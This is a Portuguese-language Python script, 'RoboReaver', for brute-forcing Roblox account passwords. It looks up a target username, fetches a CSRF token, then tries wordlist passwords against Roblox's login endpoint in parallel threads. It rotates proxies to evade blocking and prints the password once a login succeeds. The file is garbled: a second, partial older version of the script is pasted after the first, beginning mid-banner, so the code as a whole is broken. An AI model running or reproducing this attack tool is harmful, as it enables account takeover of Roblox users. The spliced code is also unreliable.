# ================================================================= #
#  RoboReaver v2.0 - Brute-Force Avançado para Roblox                #
#  Autor: [Seu Nickname]                                             #
#  GitHub: [Seu Link do GitHub]                                      #
# ================================================================= #

# --- Bloco de Auto-Instalação de Dependências ---
import os
import sys
import subprocess
import time

def check_and_install_dependencies():
    dependencies = ['requests', 'colorama', 'beautifulsoup4']
    print("[*] Verificando dependências...")
    for dep in dependencies:
        try:
            __import__(dep)
        except ImportError:
            print(f"[*] Dependência '{dep}' não encontrada. Instalando...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", dep])
            except subprocess.CalledProcessError:
                print(f"[!] FALHA AO INSTALAR '{dep}'. Por favor, instale manualmente com 'pip install {dep}' e tente novamente.")
                sys.exit(1)
    print("[+] Todas as dependências estão satisfeitas.\n")
    time.sleep(1)

check_and_install_dependencies()
# --- Fim do Bloco de Auto-Instalação ---

import requests
import threading
from colorama import Fore, Style, init
from itertools import cycle
import json

init(autoreset=True)

class Estilo:
    BRIGHT = Style.BRIGHT
    RESET = Style.RESET_ALL
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN

class RoboReaver:
    def __init__(self):
        self.username = ""
        self.wordlist_path = ""
        self.proxy_path = ""
        self.thread_count = 0
        self.passwords = []
        self.proxies = []
        self.proxy_cycle = None
        self.senha_encontrada = None
        self.senhas_testadas = 0
        self.stop_threads = False
        self.lock = threading.Lock()

    def _banner_principal(self):
        os.system('clear')
        print(f"""{Estilo.BRIGHT}{Estilo.RED}
    ____       _           ____                     __   __
   |  _ \ ___ | |__   ___ |  _ \ ___  __ _ _ __    |  \ /  |
   | |_) / _ \| '_ \ / _ \| |_) / _ \/ _` | '_ \   |       |
   |  _ < (_) | |_) | (_) |  _ <  __/ (_| | | | |  | |\ /| |
   |_| \_\___/|_.__/ \___/|_| \_\___|\__,_|_| |_|  |_|` '|_|  v2.0
           {Estilo.YELLOW}Brute-Force Avançado c/ Suporte a Proxy{Estilo.RESET}
        """)

    def _banner_sucesso(self):
        os.system('clear')
        key_art = f"""
{Estilo.YELLOW}
                     .--.
                    /.-. '----------.
                    \\'-' .--"--""-"-'
                     '--'

{Estilo.GREEN}{Estilo.BRIGHT}
============================================================
==                                                        ==
==          S E N H A   E N C O N T R A D A ! ! !         ==
==                                                        ==
============================================================
"""
        print(key_art)
        print(f"\n{Estilo.CYAN}Acesso obtido para a conta {Estilo.BOLD}{self.username}{Estilo.RESET}")
        print(f"{Estilo.CYAN}A senha correta é:{Estilo.RESET}\n")
        print(f"{' ' * 20}{Estilo.YELLOW}{Estilo.BRIGHT}>>> {self.senha_encontrada} <<<\n\n")

    def _carregar_recursos(self):
        try:
            print(f"{Estilo.BLUE}[*] Carregando wordlist de '{self.wordlist_path}'...{Estilo.RESET}")
            with open(self.wordlist_path, 'r', errors='ignore') as f:
                self.passwords = [line.strip() for line in f if line.strip()]
            if not self.passwords:
                print(f"{Estilo.RED}[!] Sua wordlist está vazia! Abortando.{Estilo.RESET}"); return False
            print(f"{Estilo.GREEN}[+] {len(self.passwords)} senhas carregadas.{Estilo.RESET}")
        except FileNotFoundError:
            print(f"{Estilo.RED}[!] Arquivo da wordlist não encontrado. Abortando.{Estilo.RESET}"); return False
        
        if self.proxy_path:
            try:
                print(f"{Estilo.BLUE}[*] Carregando proxies de '{self.proxy_path}'...{Estilo.RESET}")
                with open(self.proxy_path, 'r', errors='ignore') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                if not self.proxies:
                    print(f"{Estilo.YELLOW}[~] Arquivo de proxy está vazio. O ataque continuará sem proxies.{Estilo.RESET}")
                else:
                    self.proxy_cycle = cycle(self.proxies)
                    print(f"{Estilo.GREEN}[+] {len(self.proxies)} proxies carregados. O ataque será distribuído.{Estilo.RESET}")
            except FileNotFoundError:
                print(f"{Estilo.RED}[!] Arquivo de proxy não encontrado. Abortando.{Estilo.RESET}"); return False
        
        return True

    def _verificar_username(self):
        print(f"{Estilo.BLUE}[*] Verificando se o usuário '{self.username}' existe...{Estilo.RESET}")
        try:
            r = requests.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [self.username]})
            if r.status_code == 200 and r.json()['data']:
                print(f"{Estilo.GREEN}[+] Usuário encontrado! Prosseguindo...{Estilo.RESET}"); time.sleep(1); return True
            else:
                print(f"{Estilo.RED}[!] Usuário '{self.username}' não encontrado. Verifique o nome e tente novamente.{Estilo.RESET}"); return False
        except requests.RequestException:
            print(f"{Estilo.RED}[!] Erro de rede ao verificar usuário. Não é possível continuar.{Estilo.RESET}"); return False

    def _attempt_login(self, session, password, proxy):
        login_url = "https://auth.roblox.com/v2/login"
        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None
        
        try:
            session.headers.pop('X-CSRF-TOKEN', None) # Limpa token antigo
            response = session.post(login_url, proxies=proxies, timeout=15)
            csrf_token = response.headers.get("x-csrf-token")
            if not csrf_token: return False, "csrf_error"
            
            session.headers['X-CSRF-TOKEN'] = csrf_token
            payload = {"ctype": "Username", "cvalue": self.username, "password": password}
            
            response = session.post(login_url, json=payload, proxies=proxies, timeout=15)
            data = response.json()
            
            if "user" in data: return True, "success"
            elif response.status_code == 429: return False, "rate_limit"
            else: return False, "invalid_credentials"
        except requests.RequestException:
            return False, "proxy_error" if proxy else "network_error"

    def _worker(self, password_queue):
        with requests.Session() as session:
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            })
            while not self.stop_threads:
                try:
                    password = password_queue.get(timeout=1)
                except:
                    break
                
                proxy = next(self.proxy_cycle) if self.proxy_cycle else None
                success, reason = self._attempt_login(session, password, proxy)
                
                with self.lock:
                    self.senhas_testadas += 1
                
                if success:
                    with self.lock:
                        self.senha_encontrada = password
                        self.stop_threads = True
                    break
        password_queue.task_done()
    
    def _display_status(self):
        animation = cycle(['|', '/', '-', '\\\\'])
        start_time = time.time()
        
        while not self.stop_threads:
            with self.lock:
                total = len(self.passwords)
                progress = int(50 * self.senhas_testadas / total) if total > 0 else 0
                percent = (self.senhas_testadas / total) * 100 if total > 0 else 0
                elapsed_time = time.time() - start_time
                pass_per_second = self.senhas_testadas / elapsed_time if elapsed_time > 0 else 0
                status_bar = f"{Estilo.GREEN}{'█' * progress}{Estilo.RED}{'-' * (50 - progress)}{Estilo.RESET}"
                status_text = (
                    f"{Estilo.CYAN}{next(animation)} {Estilo.YELLOW}Testando: {self.senhas_testadas}/{total} "
                    f"[{status_bar}] {percent:.2f}% | "
                    f"{Estilo.MAGENTA}{pass_per_second:.2f} p/s | "
                    f"Tempo: {int(elapsed_time)}s{Estilo.RESET}"
                )
                sys.stdout.write(f"\r{status_text.ljust(100)}")
            time.sleep(0.1)
        sys.stdout.write(f"\r{' ' * 100}\r")

    def run(self):
        self._banner_principal()
        self.username = input(f"{Estilo.YELLOW}[?] Digite o username da conta Roblox: {Estilo.CYAN}")
        if not self.username or not self._verificar_username(): time.sleep(3); return
        
        self.wordlist_path = input(f"{Estilo.YELLOW}[?] Caminho para sua wordlist (ex: wordlist.txt): {Estilo.CYAN}")
        self.proxy_path = input(f"{Estilo.YELLOW}[?] Caminho para proxies (opcional, deixe em branco para ignorar): {Estilo.CYAN}")
        
        try:
            self.thread_count = int(input(f"{Estilo.YELLOW}[?] Threads (recom. 10-50 com proxy, 5 sem): {Estilo.CYAN}"))
        except ValueError:
            print(f"{Estilo.RED}[!] Número de threads inválido.{Estilo.RESET}"); time.sleep(2); return
        
        if not self._carregar_recursos(): time.sleep(3); return
        
        # Resetar estado para um novo ataque
        self.senha_encontrada, self.senhas_testadas, self.stop_threads = None, 0, False
        
        from queue import Queue
        password_queue = Queue()
        for p in self.passwords: password_queue.put(p)
        
        print(f"\n{Estilo.BRIGHT}Iniciando ataque em 3 segundos... Pressione CTRL+C para parar.{Estilo.RESET}"); time.sleep(3)

        threads = [threading.Thread(target=self._worker, args=(password_queue,), daemon=True) for _ in range(self.thread_count)]
        status_thread = threading.Thread(target=self._display_status, daemon=True)
        
        status_thread.start()
        for t in threads: t.start()
        
        try:
            for t in threads: t.join()
        except KeyboardInterrupt:
            print(f"\n\n{Estilo.RED}[!] Ataque interrompido pelo usuário!{Estilo.RESET}")
            self.stop_threads = True
        
        self.stop_threads = True
        status_thread.join()
        
        if self.senha_encontrada:
            self._banner_sucesso()
        else:
            print(f"\n{Estilo.RED}{Estilo.BRIGHT}[X] ATAQUE FINALIZADO. A senha não foi encontrada na sua wordlist.{Estilo.RESET}")
        
        input("\nPressione Enter para voltar ao menu...")

def main_menu():
    while True:
        try:
            reaver = RoboReaver()
            reaver._banner_principal()
            print(f"{Estilo.CYAN}   [1] Iniciar Ataque Brute-Force{Estilo.RESET}")
            print(f"{Estilo.CYAN}   [2] Sobre{Estilo.RESET}")
            print(f"{Estilo.CYAN}   [3] Sair{Estilo.RESET}\n")
            
            choice = input(f"{Estilo.YELLOW}   Escolha uma opção > {Estilo.RESET}")
            
            if choice == '1':
                reaver.run()
            elif choice == '2':
                reaver._banner_principal()
                print(f"""
        {Estilo.BRIGHT}{Estilo.MAGENTA}RoboReaver v2.0{Estilo.RESET}
        Uma ferramenta de pesquisa de segurança multi-thread.
        {Estilo.BLUE}Novidades da v2.0:{Estilo.RESET}
          - Auto-instalação de dependências.
          - Suporte a proxies para evasão de bloqueio.
          - Verificação de existência do nome de usuário.
          - Manipulação inteligente de erros de rede/proxy.
          - Interface e organização de código aprimoradas.
        
        {Estilo.CYAN}Autor: [Seu Nickname]{Estilo.RESET}
        {Estilo.CYAN}GitHub: [Link do seu GitHub]{Estilo.RESET}
                """)
                input("\nPressione Enter para voltar ao menu...")
            elif choice == '3':
                print(f"\n{Estilo.YELLOW}Encerrando...{Estilo.RESET}"); sys.exit(0)
            else:
                print(f"\n{Estilo.RED}[!] Opção inválida.{Estilo.RESET}"); time.sleep(1)
        except Exception as e:
            print(f"\n{Estilo.RED}Um erro inesperado ocorreu: {e}")
            input("Pressione Enter para reiniciar o menu...")

if __name__ == "__main__":
    main_menu()| |_) / _ \| '_ \ / _ \| |_) / _ \/ _` | '_ \\
|  _ < (_) | |_) | (_) |  _ <  __/ (_| | | | |
|_| \_\___/|_.__/ \___/|_| \_\___|\__,_|_| |_|
        {Estilo.YELLOW}Brute-Force Avançado para Roblox{Estilo.RESET}
    """)

def banner_sucesso(senha):
    os.system('clear')
    print(Estilo.GREEN + Estilo.BRIGHT)
    print("*" * 60)
    print("*" + " " * 58 + "*")
    print(f"*   {'SENHA ENCONTRADA COM SUCESSO!':^56}   *")
    print("*" + " " * 58 + "*")
    print("*" * 60)
    print(f"\n\n{Estilo.CYAN}A senha para a conta foi localizada:\n")
    print(f"{' ' * 20}{Estilo.YELLOW}>> {senha} <<\n\n")
    print(Estilo.GREEN + "*" * 60)
    print(Style.RESET_ALL)

# --- Lógica de Brute-Force ---

def attempt_login(session, username, password):
    """
    Tenta fazer login com um único par de username/senha.
    Retorna True em caso de sucesso, False em caso de falha.
    """
    login_url = "https://auth.roblox.com/v2/login"
    
    # 1. Obter o token X-CSRF, essencial para a requisição de login
    try:
        response = session.post(login_url, timeout=10)
        csrf_token = response.headers.get("x-csrf-token")
        if not csrf_token:
            return False, "csrf_error"
        session.headers['X-CSRF-TOKEN'] = csrf_token
    except requests.RequestException:
        return False, "network_error"

    # 2. Montar e enviar a requisição de login
    payload = {
        "ctype": "Username",
        "cvalue": username,
        "password": password
    }
    try:
        response = session.post(login_url, json=payload, timeout=10)
        data = response.json()
        
        # O roblox retorna um 'user' object em caso de sucesso
        if "user" in data:
            return True, "success"
        # Verifica erros conhecidos
        elif "errors" in data and any(e.get("code") == 1 for e in data["errors"]):
            return False, "invalid_credentials"
        elif response.status_code == 429: # Too Many Requests
            return False, "rate_limit"
        else:
            return False, "unknown_error"
            
    except (requests.RequestException, ValueError):
        return False, "network_error"


def worker(username, wordlist_queue):
    """
    Função que cada thread executará para testar as senhas.
    """
    global senha_encontrada, senhas_testadas, stop_threads
    
    # Cada thread tem sua própria sessão para simular um navegador independente
    with requests.Session() as session:
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Content-Type': 'application/json;charset=UTF-8',
            'Accept': 'application/json, text/plain, */*'
        })

        while not stop_threads:
            try:
                # Pega uma senha da fila
                password = wordlist_queue.get(timeout=1)
            except:
                # Fila vazia, a thread pode parar
                break
                
            if stop_threads: break
            
            success, reason = attempt_login(session, username, password)

            with lock:
                senhas_testadas += 1
            
            if success:
                with lock:
                    senha_encontrada = password
                    stop_threads = True # Sinaliza para todas as outras threads pararem
                wordlist_queue.task_done()
                break # Sai do loop da thread
            
            elif reason == "rate_limit":
                 # Se o Roblox nos bloquear, é melhor parar por um tempo
                 with lock:
                    if not stop_threads: # Evita múltiplas mensagens de erro
                        print(f"\n{Estilo.RED}{Estilo.BRIGHT}[!] Fomos temporariamente bloqueados (Rate Limit). Pausando...{Estilo.RESET}")
                        stop_threads = True # Para o ataque atual
                        senha_encontrada = "RATE_LIMITED"
            
            wordlist_queue.task_done()

def display_status():
    """
    Thread dedicada a mostrar o status do ataque em tempo real.
    """
    animation = cycle(['|', '/', '-', '\\'])
    start_time = time.time()
    
    while not stop_threads:
        with lock:
            if total_senhas == 0:
                progress = 0
                percent = 0
            else:
                progress = int(50 * senhas_testadas / total_senhas)
                percent = (senhas_testadas / total_senhas) * 100
            
            elapsed_time = time.time() - start_time
            pass_per_second = senhas_testadas / elapsed_time if elapsed_time > 0 else 0
            
            status_bar = f"{Estilo.GREEN}{'█' * progress}{Estilo.RED}{'-' * (50 - progress)}{Estilo.RESET}"
            
            status_text = (
                f"{Estilo.CYAN}{next(animation)} {Estilo.YELLOW}Progresso: {senhas_testadas}/{total_senhas} "
                f"[{status_bar}] {percent:.2f}% | "
                f"{Estilo.MAGENTA}{pass_per_second:.2f} senhas/s"
            )
            
            sys.stdout.write(f"\r{status_text.ljust(80)}")
            sys.stdout.flush()
        
        time.sleep(0.1)
    
    # Limpa a linha de status no final
    sys.stdout.write(f"\r{' ' * 100}\r")
    sys.stdout.flush()

# --- Função Principal do Ataque ---
def start_bruteforce():
    global senha_encontrada, senhas_testadas, stop_threads, total_senhas
    
    banner_principal()
    
    # 1. Obter informações do usuário
    username = input(f"{Estilo.YELLOW}[?] Digite o username da conta Roblox: {Estilo.CYAN}")
    if not username:
        print(f"\n{Estilo.RED}[!] Username não pode ser vazio.{Estilo.RESET}"); time.sleep(2); return

    wordlist_path = input(f"{Estilo.YELLOW}[?] Digite o caminho para sua wordlist (ex: wordlist.txt): {Estilo.CYAN}")
    if not os.path.exists(wordlist_path):
        print(f"\n{Estilo.RED}[!] Arquivo da wordlist não encontrado em '{wordlist_path}'.{Estilo.RESET}"); time.sleep(2); return
        
    try:
        thread_count = int(input(f"{Estilo.YELLOW}[?] Quantas threads usar (recom. 10-50): {Estilo.CYAN}"))
    except ValueError:
        print(f"\n{Estilo.RED}[!] Número de threads inválido.{Estilo.RESET}"); time.sleep(2); return

    # 2. Carregar a wordlist e preparar a fila
    print(f"\n{Estilo.BLUE}[*] Carregando a wordlist, por favor aguarde...{Estilo.RESET}")
    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f.readlines() if line.strip()]
        total_senhas = len(passwords)
        if total_senhas == 0:
            print(f"\n{Estilo.RED}[!] Sua wordlist está vazia!{Estilo.RESET}"); time.sleep(2); return
    except Exception as e:
        print(f"\n{Estilo.RED}[!] Erro ao ler a wordlist: {e}{Estilo.RESET}"); time.sleep(2); return

    # Reinicia as variáveis de controle para um novo ataque
    senha_encontrada = None
    senhas_testadas = 0
    stop_threads = False

    # Coloca as senhas na fila para as threads consumirem
    from queue import Queue
    wordlist_queue = Queue()
    for p in passwords:
        wordlist_queue.put(p)

    print(f"{Estilo.GREEN}[+] Wordlist carregada com {total_senhas} senhas.{Estilo.RESET}")
    print(f"{Estilo.BRIGHT}Iniciando ataque em 3 segundos...{Estilo.RESET}")
    time.sleep(3)

    # 3. Iniciar as threads
    threads = []
    
    # Thread de status
    status_thread = threading.Thread(target=display_status)
    status_thread.daemon = True
    status_thread.start()

    # Threads de trabalho (workers)
    for _ in range(thread_count):
        thread = threading.Thread(target=worker, args=(username, wordlist_queue))
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # 4. Aguardar a conclusão
    try:
        # Aguarda as threads finalizarem, ou o status ser interrompido
        wordlist_queue.join() # Bloqueia até que a fila esteja vazia
        stop_threads = True # Garante que a thread de status pare
        
    except KeyboardInterrupt:
        print(f"\n\n{Estilo.RED}[!] Ataque interrompido pelo usuário!{Estilo.RESET}")
        stop_threads = True

    status_thread.join() # Espera a thread de status terminar
    for thread in threads:
        thread.join(timeout=1.0) # Dá um tempinho para as threads de trabalho encerrarem

    # 5. Exibir o resultado
    if senha_encontrada and senha_encontrada != "RATE_LIMITED":
        banner_sucesso(senha_encontrada)
    elif senha_encontrada == "RATE_LIMITED":
        print(f"\n{Estilo.RED}{Estilo.BRIGHT}[X] ATAQUE FALHOU! O Roblox bloqueou nossas tentativas.{Estilo.RESET}")
        print(f"{Estilo.YELLOW}    Tente novamente mais tarde ou use menos threads.{Estilo.RESET}")
    else:
        print(f"\n{Estilo.RED}{Estilo.BRIGHT}[X] ATAQUE FINALIZADO! A senha não foi encontrada na sua wordlist.{Estilo.RESET}")
        print(f"{Estilo.YELLOW}    Tente uma wordlist diferente ou maior.{Estilo.RESET}")
        
    input("\nPressione Enter para voltar ao menu...")


# --- Menu Principal ---
def main_menu():
    while True:
        banner_principal()
        print(f"{Estilo.CYAN}   [1] Iniciar Ataque Brute-Force{Estilo.RESET}")
        print(f"{Estilo.CYAN}   [2] Sobre{Estilo.RESET}")
        print(f"{Estilo.CYAN}   [3] Sair{Estilo.RESET}\n")
        
        choice = input(f"{Estilo.YELLOW}   Escolha uma opção > {Estilo.RESET}")
        
        if choice == '1':
            start_bruteforce()
        elif choice == '2':
            banner_principal()
            print(f"""
    {Estilo.BRIGHT}{Estilo.MAGENTA}RoboReaver v1.0{Estilo.RESET}
    
    Uma ferramenta de brute-force multi-thread avançada,
    construída para fins de pesquisa e testes de segurança
    em contas Roblox em um ambiente controlado.
    
    {Estilo.BLUE}Funcionalidades:{Estilo.RESET}
      - Ataque Multi-Thread para máxima velocidade.
      - Simulação de Navegador com tokens CSRF.
      - Detecção de Rate Limit.
      - Interface de status em tempo real.
    
    {Estilo.CYAN}Autor: [Seu Nickname]{Estilo.RESET}
    {Estilo.CYAN}GitHub: [Link do seu GitHub]{Estilo.RESET}
            """)
            input("\nPressione Enter para voltar ao menu...")
        elif choice == '3':
            print(f"\n{Estilo.YELLOW}Encerrando...{Estilo.RESET}")
            sys.exit(0)
        else:
            print(f"\n{Estilo.RED}[!] Opção inválida, tente novamente.{Estilo.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
